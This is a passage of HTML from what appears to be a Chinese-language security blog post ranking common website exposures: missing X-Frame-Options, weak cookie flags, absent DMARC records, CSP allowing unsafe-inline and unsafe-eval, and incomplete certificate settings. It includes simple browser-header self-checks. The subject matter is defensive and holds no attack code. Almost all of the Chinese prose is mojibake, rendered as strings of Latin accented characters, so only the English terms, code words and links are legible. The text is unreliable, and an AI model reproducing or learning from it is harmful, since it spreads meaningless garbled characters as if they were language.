æ‘˜è¦</h2>\n<p>ä»¥å»é™¤æ¥µç«¯å€¼ä¹‹å¾Œçš„æª¢æ¸¬çµæœçµ±è¨ˆï¼Œæ’åˆ—å‡ºç›®å‰ç™¼ç”Ÿæ¯”ä¾‹å¤§æ–¼ 50 % çš„ç¶²è·¯æ›éšªï¼Œä¸¦èªªæ˜<strong>å¯èƒ½é€ æˆçš„é¢¨éšª</strong>ä»¥åŠå¦‚ä½•ç°¡å–®çš„é€²è¡Œ<strong>åˆæ­¥è‡ªæˆ‘æ›éšªæª¢æ¸¬</strong>ã€‚</p>\n<p>ä¹‹å¾Œæœƒåœ¨ç•ªå¤–ç¯‡ï¼ˆäºŒ ï¼‰ä¸­æä¾›é€™å¹¾é …<strong>é¢¨éšªçš„æ”¹å–„è¤‡é›œåº¦</strong>èªªæ˜ä»¥åŠè§£æ±ºè¾¦æ³•å’Œé—œéµå­—ï¼Œå¦å¤–ä¹Ÿæœƒèªªæ˜é€™äº›æ›éšªèˆ‡ç›®å‰ç¾è¡Œä¸€äº›è¼ƒç‚º<strong>çŸ¥åæ³•è¦çš„é—œè¯</strong>ã€‚</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D\">#</a> å¸¸è¦‹ç¶²ç«™æ›éšªæ’å</h2>\n<h2 id=\"%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼• X-Frame-Options æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’è¡Œç¬¬äº”çš„ X-Frame-Options è¨­ç½®ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 50ï¼… çš„ç¶²ç«™è¨­ç½®çš„å®‰å…¨ç­‰ç´šä¸è¶³æˆ–æ˜¯æ²’æœ‰é€²è¡Œè¨­ç½®ï¼ŒX-Frame-Options ç”¨é€”ç‚º<strong>é‡å° Iframe é»æ“ŠåŠ«æŒæ”»æ“Š</strong>çš„æ‰‹æ³•é€²è¡Œé˜²ç¦¦ï¼Œé¿å…ç¶²é è¢«å…§åµŒã€‚</p>\n<p><strong>é»æ“ŠåŠ«æŒæ”»æ“Š</strong>æ˜¯ä¸€ç¨®æ”»æ“Šè€…åœ¨ç¶²ç«™ä¸Šé€šé iframe éš±è—ç›®æ¨™ç¶²é ï¼Œæ¬ºé¨™ç”¨æˆ¶é»æ“Šéš±è—æƒ¡æ„é€£çµï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œè¦†è“‹åœ¨å½±ç‰‡æ’­æ”¾éµä¸Šçš„éš±è—è¶…é€£çµï¼Œç•¶ä½¿ç”¨è€…é»æ“Šå¾Œï¼Œä¾¿æœƒä¸‹è¼‰æƒ¡æ„ç¨‹å¼æˆ–æ˜¯å½ˆå‡ºæƒ¡æ„ç¶²é è®“ä½¿ç”¨è€…ç€è¦½ï¼Œè®“ä½¿ç”¨è€…çš„æ©Ÿæ•è³‡è¨Šå¤–æ´©è€Œå°è‡´è³‡å®‰äº‹ä»¶çš„ç™¼ç”Ÿï¼Œé€™æ¨£çš„æ”»æ“Šå¾ˆæœ‰å¯èƒ½æœƒä½¿ç¶²ç«™æ¥­è€…çš„å•†è­½å—åˆ°æå®³ã€‚</p>\n<p>è€Œç™¼ç”Ÿæ­¤é …æ›éšªè¡¨ç¤ºç•¶æ”»æ“Šè€…ç²å–é€™é …è³‡è¨Šæ™‚ï¼Œå¾ˆæœ‰å¯èƒ½æœƒå˜—è©¦å°ç¶²ç«™é€²è¡Œ Iframe é»æ“ŠåŠ«æŒçš„æ”»æ“Šæ‰‹æ³•ã€‚</p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A\">#</a> æ–°èåƒè€ƒï¼š</h3>\n<p><a href=\"https://nakedsecurity.sophos.com/2019/08/29/web-clickjacking-fraud-makes-a-comeback-thanks-to-javascript-tricks/\"><strong>Web clickjacking fraud makes a comeback thanks to JavaScript tricks</strong></a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F\">#</a> åˆæ­¥è‡ªæˆ‘æª¢è¦–æ–¹å¼</h3>\n<p>æŒ‰ä¸‹ F12 å¾Œï¼Œé»é¸ Network åœ¨å·¦æ–¹é–‹å•Ÿæƒ³è¦æª¢è¦–çš„æª”æ¡ˆï¼Œæ¥è‘—é¸æ“‡ Header ä¾¿å¯ä»¥æŸ¥çœ‹æ˜¯å¦æœ‰è¨­ç½® <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options\">X-Frame-Options</a>ã€‚</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p1.png\" alt=\"\"></p>\n<p><strong>X-Frame-Optionsæœ‰ä¸‰ç¨®å€¼ï¼š</strong></p>\n<p><code>DENY</code>è¡¨ç¤ºç¶²é ç„¡è«–å¦‚ä½•éƒ½ç„¡æ³•è¢«åµŒå…¥åˆ° frame ä¸­ï¼Œå³ä½¿æ–¼ç›¸åŒç¶²åŸŸå…§åµŒå…¥ä¹Ÿä¸å…è¨±ã€‚</p>\n<p><code>SAMEORIGIN</code>å”¯æœ‰ç•¶ç¬¦åˆ<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy\">åŒæºæ”¿ç­–</a>ä¸‹ï¼Œæ‰èƒ½è¢«åµŒå…¥åˆ° frame ä¸­ã€‚</p>\n<p><code>ALLOW-FROM _uri_</code>ï¼»å·²å»¢æ­¢ï¼½å”¯æœ‰åˆ—è¡¨è¨±å¯çš„ URI æ‰èƒ½åµŒå…¥åˆ° frame ä¸­ï¼Œä¸éæ–°ç‰ˆç€è¦½å™¨å·²ä¸å†æ”¯æ´æ­¤æŒ‡ä»¤ã€‚</p>\n<h2 id=\"%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼”Cookie åŸºæœ¬è¨­å®šæœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’åç¬¬å››çš„ Cookie åŸºæœ¬è¨­å®šæœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 60ï¼… çš„ç¶²ç«™è¨­ç½®å®‰å…¨ç­‰ç´šä¸è¶³æˆ–æ˜¯æ²’æœ‰é€²è¡Œè¨­ç½®ï¼Œè€Œ Cookie çš„ä¸‰é …åŸºæœ¬è¨­å®šç‚ºï¼Œèƒ½å¤ <strong>é˜»æ­¢ï¼ˆ XSS ï¼‰è·¨ç«™è…³æœ¬æ”»æ“Šå½±éŸ¿æ“´å¤§</strong>çš„ HttpOnly ã€<strong>å¼·åŒ– Https æ©Ÿåˆ¶</strong>çš„ Secure ä»¥åŠ<strong>é é˜²ï¼ˆ CSRF ï¼‰è·¨ç«™è«‹æ±‚å½å†’</strong>çš„ SameSite ã€‚</p>\n<p>ç”±æ–¼ä¸‰é …å®‰å…¨è¨­å®šä¹ŸåŒæ¨£éƒ½æ˜¯ç¶²ç«™å…¬é–‹è³‡è¨Šï¼Œåœ¨ç›¸é—œè³‡è¨Šå®¹æ˜“è¢«å–å¾—çš„æƒ…æ³ä¸‹ä½¿ä¸‰é …åŸºæœ¬è¨­å®šå¾ˆå®¹æ˜“æˆç‚ºæ”»æ“Šè€…ç¯©é¸æ”»æ“Šæ¨™çš„ç¬¬ä¸€å±¤éæ¿¾ï¼Œä¹Ÿå°±æ˜¯ç•¶æ”»æ“Šè€…ç™¼ç¾é€™ä¸‰é …è¨­å®šè¨­ç½®ä¸å…¨ç”šè‡³æœªè¨­ç½®çš„ç¶²ç«™æ¥­è€…ï¼Œæ”»æ“Šè€…æœƒç‰¹åˆ¥é—œæ³¨ï¼Œå°‡ç¶²ç«™ç´å…¥æ”»æ“Šçš„æ¨™çš„æ¸…å–®ã€‚</p>\n<h3 id=\"xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A\"><a class=\"direct-link\" href=\"#xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A\">#</a> XSS è·¨ç«™è…³æœ¬æ”»æ“Šï¼š</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\"><strong>é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰-èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</strong><br>\n</a></p>\n<h3 id=\"csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A\"><a class=\"direct-link\" href=\"#csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A\">#</a> CSRF è·¨ç«™è«‹æ±‚å½å†’ï¼š</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\"><strong>é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸€ï¼‰-èªè­˜ CSRFï¼ˆCross Site Request Forgeryï¼‰</strong><br>\n</a></p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2\">#</a> æ–°èåƒè€ƒï¼š</h3>\n<p><a href=\"https://www.ithome.com.tw/news/111254\"><strong>éº¥ç•¶å‹å®˜ç¶²é­çˆ†æœ‰XSSæ¼æ´ï¼Œå¯è§£å¯†ç«Šå–ç”¨æˆ¶å¯†ç¢¼</strong><br>\n</a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2\">#</a> åˆæ­¥è‡ªæˆ‘æª¢è¦–æ–¹å¼</h3>\n<p>å› ç‚ºé€™å ªç¨±ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±çš„ä¸‰å€‹åŸºæœ¬è¨­å®šï¼Œç‚ºäº†ä¸‰é …åŸºæœ¬è¨­å®šå¯«äº†ä¸€ç¯‡æ–‡ç« ï¼Œæä¾›è‡ªæˆ‘æª¢è¦–é¢¨éšªçš„æ–¹å¼ä»¥åŠæ›´æ·±å…¥çš„èªªæ˜ï¼Œæœ‰èˆˆè¶£äº†è§£æ›´å¤šé—œæ–¼ Cookie ä¸‰é …åŸºæœ¬è¨­å®šè³‡è¨Šçš„æœ‹å‹å¯ä»¥åƒè€ƒä¸‹æ–¹æ–‡ç« </p>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly\"><strong>é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸‰ï¼‰-ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼ˆSecure &amp; SameSite &amp; HttpOnlyï¼‰</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\">#</a> â„–ï¼“ éƒµä»¶ç³»çµ± DMARCÂ è¨­å®š</h2>\n<p>æ’åç¬¬ä¸‰çš„éƒµä»¶ç³»çµ± DMARC è¨­å®šï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 70ï¼… çš„ç¶²ç«™DMARC è¨­ç½®ä¸å…¨æˆ–ç„¡è¨­ç½®ï¼Œ<strong>DMARC æœƒå‘æ”¶ä»¶ä¼ºæœå™¨æŒ‡ç¤ºè©²å¦‚ä½•è™•ç†ç‰¹å®šéƒµä»¶</strong>ï¼Œè®“ä¼ºæœå™¨åœ¨æ”¶åˆ°ç–‘ä¼¼ä¾†è‡ªè‡ªèº«æ©Ÿæ§‹å»æœªé€šéé©—è­‰æª¢æŸ¥çš„éƒµä»¶ï¼Œæˆ–æ˜¯ä¸ç¬¦åˆ DMARC æ”¿ç­–è¨˜éŒ„ä¸­é©—è­‰è¦å®šçš„éƒµä»¶æ™‚ï¼Œæ¡å–åˆé©çš„è™•ç½®æ–¹å¼ã€‚</p>\n<p>ä¾‹å¦‚ç„¡æ³•é€šéé©—è­‰çš„éƒµä»¶æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯<strong>å†’ç”¨è‡ªèº«æ©Ÿæ§‹åç¾©çš„éƒµä»¶</strong>ï¼Œå¦ä¸€ç¨®å‰‡æ˜¯<strong>å¾æœªç¶“é©—è­‰çš„ä¼ºæœå™¨å¯„å‡ºçš„éƒµä»¶</strong>ï¼Œ DMARC ä¾¿æœƒæ‹’çµ•æƒ¡æ„é›»å­éƒµä»¶è¨Šæ¯ï¼ˆæ‹’æ”¶ï¼‰æˆ–éš”é›¢æƒ¡æ„é›»å­éƒµä»¶è¨Šæ¯ï¼ˆåƒåœ¾ä¿¡ä»¶ï¼‰ï¼Œ<strong>å¼·åŒ–æ”¶ä»¶è€…å°æœªæˆæ¬Šéƒµä»¶çš„è­˜åˆ¥</strong>ï¼Œè—‰æ­¤<strong>è®“ç¤¾äº¤å·¥ç¨‹ç™¼ç”Ÿçš„å¯èƒ½æ€§æ¸›ä½</strong>ï¼Œæ˜¯<strong>é™¤äº†é€²è¡Œç¤¾äº¤å·¥ç¨‹æ¼”ç·´ä»¥åŠå¼·åŒ–å“¡å·¥è³‡å®‰æ„è­˜ä»¥å¤–å¾ˆå¥½çš„é˜²è­·æ‰‹æ®µ</strong>ã€‚</p>\n<p><strong>DMARC çš„è¨­å®šåœ¨è¿‘æœŸå—é‡è¦–ç¨‹åº¦é€æ¼¸æé«˜</strong>ï¼Œå¦‚ä¸–ç•ŒçŸ¥åé¡§å•å…¬å¸ Gartner å°±åœ¨ä»–å€‘çš„ <a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">list of critical security projects</a> ä¸­ï¼Œå»ºè­°å°‡ DMARC ç´å…¥å®‰å…¨è©•ä¼°ï¼Œè€Œç¶œåˆäº†å ±å‘Šä»¥åŠæ¸¬è©¦çµæœï¼Œå…¶å¯¦ä¹Ÿæ„å‘³è‘—ç›®å‰å¤§å¤šæ•¸çš„æ¥­è€…ä»æ˜¯ä¾é <strong>ç¤¾äº¤å·¥ç¨‹æ¼”ç·´</strong>ä»¥åŠ<strong>è³‡å®‰è¨“ç·´</strong>ä¾†ä½œç‚ºé˜²ç¯„ç¤¾äº¤å·¥ç¨‹çš„æ‰‹æ³•ï¼Œä½†å› çˆ²ç¾åœ¨çš„æ”»æ“Šæ‰‹æ³•ï¼Œè¨±å¤šé§­å®¢åœ¨æ”»æ“Šå‰éƒ½æœƒåˆ©ç”¨**ã€Œå‹’ç´¢è»Ÿé«”å³æœå‹™ã€ ï¼ˆRansomware-as-a-Serviceï¼ŒRaaSï¼‰**çš„æ–¹å¼ï¼Œé™ä½æ”»æ“ŠæŠ€è¡“é–€æª»åŠæˆæœ¬æé«˜æ”»æ“Šé »æ¬¡ï¼Œè€Œåœ¨ç–«æƒ…å½±éŸ¿å¤§å®¶é€æ¼¸ç¿’æ…£åœ¨å®¶å·¥ä½œçš„æƒ…æ³ä¸‹ï¼Œç¤¾äº¤å·¥ç¨‹è®Šå¾—æ›´åŠ é˜²ä¸å‹é˜²ï¼Œé å‚³çµ±çš„æ–¹å¼ä¸¦ä¸èƒ½ç¢ºä¿è‡ªèº«ä¸å—ç¤¾äº¤å·¥ç¨‹çš„å½±éŸ¿ã€‚</p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3\">#</a> æ–°èåƒè€ƒï¼š</h3>\n<p><a href=\"https://www.ithome.com.tw/news/145223\"><strong>å ±å°ï¼šå·´è¥¿æœ€å¤§é†«ç™‚è¨ºæ–·æ¥­è€…Grupo Fleuryä¹Ÿé­å‹’ç´¢è»Ÿé«”REvilæ”»é™·</strong><br>\n</a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3\">#</a> åˆæ­¥è‡ªæˆ‘æª¢è¦–æ–¹å¼</h3>\n<p>åœ¨æª¢è¦– DMARC çš„è¨­å®šæ™‚ï¼Œå…¶å¯¦æœ€å¤§çš„å•é¡Œåœ¨æ–¼æ²’æœ‰è¨­å®š DMARC ï¼Œè€Œé€šå¸¸æª¢è¦–è‡ªèº« DMARC çš„è¨­å®šéœ€è¦å‰å¾€ç¶²åŸŸä¾›æ‡‰å•†ç¶²ç«™æŸ¥çœ‹ DMARC çš„ TXT è¨˜éŒ„ï¼š</p>\n<ol>\n<li>ç™»å…¥ç¶²åŸŸä¾›æ‡‰å•†æä¾›çš„ç®¡ç†æ§åˆ¶å°ã€‚</li>\n<li>æ‰¾å‡ºç”¨æ–¼æ›´æ–°ç¶²åŸŸ DNS TXT è¨˜éŒ„çš„ç¶²é æˆ–è³‡è¨Šä¸»é ã€‚</li>\n<li>æŸ¥çœ‹ç¶²åŸŸçš„ DNS TXT è¨˜éŒ„ã€‚å¦‚æœç¶²åŸŸå·²ç¶“æœ‰ DMARC è¨˜éŒ„ï¼Œå°±æœƒçœ‹åˆ°ä¸€ç­†ä»¥ v=DMARC é–‹é ­çš„ TXT è¨˜éŒ„é …ç›®ã€‚</li>\n</ol>\n<h3 id=\"%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A\">#</a> å¦‚ä½•æª¢æŸ¥ç¾æœ‰çš„ DMARCÂ è¨˜éŒ„åƒè€ƒï¼š</h3>\n<p><a href=\"https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254\"><strong>è¨­å®š DMARC å‰çš„æ³¨æ„äº‹é …</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼’CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’åç¬¬äºŒçš„CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å°‡è¿‘ 90% çš„ç¶²ç«™CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œ**ç¶²é å…§å®¹å®‰å…¨æ”¿ç­– ï¼ˆ Content Security Policy, CSPï¼‰**ä¸»è¦æ˜¯ç‚ºäº†é˜²ç¯„ <strong>XSSï¼ˆè·¨ç«™è…³æœ¬æ”»æ“Šï¼‰</strong>ï¼Œä»¥å‘ŠçŸ¥ç€è¦½å™¨ç™¼å‡ºçš„ Request ä½ç½®æ˜¯å¦å—åˆ°ä¿¡ä»»ä¾†é˜»æ“‹éé æœŸçš„å°å¤–é€£ç·šï¼ŒåŠ å¼·ç¶²ç«™å®‰å…¨æ€§ï¼Œåœ¨ http header å®šç¾©é™åˆ¶è¼‰å…¥çš„è·¨ç«™ script åƒæ˜¯ <code>img-srcã€script-src</code>â€¦ç­‰é€™äº›å¯ä»¥è¼‰å…¥å¤–éƒ¨è³‡æºçš„æ¨™ç±¤ã€‚</p>\n<p>æ ¹æ“šæª¢æ¸¬çš„çµæœé¡¯ç¤ºï¼Œå…¶å¯¦å¹¾ä¹æª¢æ¸¬å‡ºæœ‰éŒ¯èª¤è¨­ç½®çš„ç¶²ç«™è£¡éƒ½æœ‰ <code>unsafe-inline</code> ä»¥åŠ <code>unsafe-eval</code> çš„èº«å½±ï¼Œä½†å…¶å¯¦ CSP æ˜¯<strong>é è¨­ç¦æ­¢ä½¿ç”¨ inline script æˆ– inline CSS ä»¥åŠ eval å‡½å¼</strong>çš„ã€‚</p>\n<p>ä»¥ç¦æ­¢ä½¿ç”¨ inline script æˆ– inline CSS ä¾†èªªï¼Œ<strong>ç‚ºäº†é–‹ç™¼æ™‚ç¨‹æˆ–æ˜¯æ›´å¥½çš„å¼•ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶</strong>ï¼Œç¶“å¸¸æœƒåœ¨ HTML ä¸­å¯«å…¥ inline çš„ç¨‹å¼ç¢¼ï¼Œä½†é€™ç¨®æ‰‹æ³•ä¹Ÿæ˜¯æ”»æ“Šè€…æœƒä½¿ç”¨çš„ï¼Œç„¶è€Œåœ¨ç€è¦½å™¨ä¸¦ä¸èƒ½ç¢ºèªçš„æƒ…æ³ä¸‹ï¼Œç‚ºæ±‚å®‰å…¨ï¼Œ CSP å¸Œæœ›ä»¥é è¨­ç¦æ­¢çš„æ–¹å¼è®“é–‹ç™¼äººå“¡å°‡ inline çš„ç¨‹å¼ç¢¼ç§»åˆ°å¤–éƒ¨ä¾†é¿å… HTML ä¸­å‡ºç¾ inline ç¨‹å¼çš„å¯èƒ½ï¼Œè€Œç¦æ­¢ eval å‡½å¼æ˜¯å› ç‚ºé›–ç„¶ eval ï¼ˆï¼‰åœ¨é–‹ç™¼ä¸Šæœ‰ä¸€å®šçš„æ–¹ä¾¿æ€§ï¼Œä½†ä¹Ÿå› æ­¤å®¹æ˜“è¡ç”Ÿå‡º XSS çš„é¢¨éšªï¼Œæ‰€ä»¥ <strong>eval å‡½å¼èˆ‡ inline çš„ç¨‹å¼ç¢¼ç›¸åŒï¼Œéƒ½æ˜¯è¢« CSP é è¨­ç¦æ­¢</strong>çš„ã€‚</p>\n<p>å…¶å¯¦çœ‹åˆ°é€™é‚Šæ‡‰è©²å¯ä»¥ç™¼ç¾ï¼Œåœ¨ CSP ç™¼ç”ŸéŒ¯èª¤è¨­ç½®çš„æƒ…æ³åŸºæœ¬ä¸Šæœƒæ˜¯å› ç‚ºåœ¨é–‹ç™¼çš„éç¨‹ä¸­ç‚ºäº†é–‹ç™¼ä¸Šçš„ä¾¿åˆ©æˆ–ç‚ºäº†æ›´å¥½çš„å¼•ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶è€Œå°è‡´ï¼Œä¸éå¾å¯¦å‹™çš„è§’åº¦ä¸Šä¾†èªªï¼Œé€™æ¨£çš„é¸æ“‡ç„¡å¯åšéï¼Œåªæ˜¯è©²å¦‚ä½•åœ¨è³‡å®‰ä»¥åŠé–‹ç™¼çš„é€Ÿåº¦åŠä¾¿åˆ©æ€§ä¸Šå–å¾—å¹³è¡¡ï¼Œç„¡è«–æ˜¯åœ¨å…¶ä»–é‡å° XSS æ–¹é¢è£œå¼·æˆ–æ›´æ”¹è¨­ç½®å…¶å¯¦éƒ½è¡Œï¼Œå› æ­¤ï¼Œåœ¨ä¸‹ä¸€ç¯‡è£¡æˆ‘ä¹Ÿæœƒé‡å°é€™å€‹å•é¡Œæå‡ºä¸€äº›è§£æ±ºè¾¦æ³•ï¼Œå¸Œæœ›è®“å¤§å®¶èƒ½å¤ ä¾æ“šè‡ªèº«çš„æƒ…æ³å»åšä¸€äº›èª¿æ•´ã€‚</p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-4\">#</a> åˆæ­¥è‡ªæˆ‘æª¢è¦–æ–¹å¼</h3>\n<p>æŒ‰ä¸‹ F12 å¾Œï¼Œé»é¸ Network åœ¨å·¦æ–¹é–‹å•Ÿæƒ³è¦æª¢è¦–çš„æª”æ¡ˆï¼Œæ¥è‘—é¸æ“‡ Header ä¾¿å¯ä»¥æŸ¥çœ‹æ˜¯å¦æœ‰è¨­ç½® CSP ä»¥åŠ CSP æ˜¯å¦æœ‰ unsafe-inline ä»¥åŠ unsafe-eval çš„èº«å½±ã€‚</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p2.png\" alt=\"\"></p>\n<h2 id=\"%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼‘ç¶²ç«™æ†‘è­‰å®Œæ•´æ€§ä¸è¶³</h2>\n<p>æ’åç¬¬ä¸€çš„ç¶²ç«™æ†‘è­‰å®Œæ•´æ€§ä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰ 90% çš„å®Œæ•´æ€§ä¸è¶³ä¾‹å¦‚<strong>æ†‘è­‰æ’¤éŠ·æ©Ÿåˆ¶æœªè¨­å®šå®Œæ•´</strong>æˆ–<strong>æ†‘è­‰æˆæ¬Šæ©Ÿé—œè³‡æºç´€éŒ„æª¢æŸ¥</strong>ï¼Œåœ¨æ²’æœ‰é€™äº›è¨­å®šçš„æƒ…æ³ä¸‹æ¥­è€…å¾ˆé›£é˜²å µä»»æ„æ•¸ä½æ†‘è­‰èªè­‰æ©Ÿæ§‹æ“…è‡ªç°½ç½²ç¶²åŸŸæ†‘è­‰ï¼Œè€Œæ†‘è­‰å®Œæ•´æ€§ä¸è¶³çš„æ¥­è€…ä¸­é‚„åŒ…å«äº†<strong>ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†</strong>åŠ<strong>éæœŸæ†‘è­‰</strong>èˆ‡<strong>éèˆŠçš„ SSL/TLS å”è­°</strong>ï¼Œä»¥ä¸Šå•é¡Œå¢åŠ äº†æ¥­è€…åœ¨æ†‘è­‰å±¤é¢å¯èƒ½ç™¼ç”Ÿè³‡å®‰äº‹ä»¶çš„é¢¨éšªæ©Ÿç‡ã€‚</p>\n<h3 id=\"%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%86%91%E8%AD%89%E6%92%A4%E9%8A%B7%E6%A9%9F%E5%88%B6%E6%9C%AA%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%95%B4%EF%BC%9A\">#</a> <strong>æ†‘è­‰æ’¤éŠ·æ©Ÿåˆ¶æœªè¨­å®šå®Œæ•´ï¼š</strong></h3>\n<p>å¯èƒ½æ˜¯æœªæä¾› CRL æˆ– OCSPã€‚ CRL æˆ– OCSP 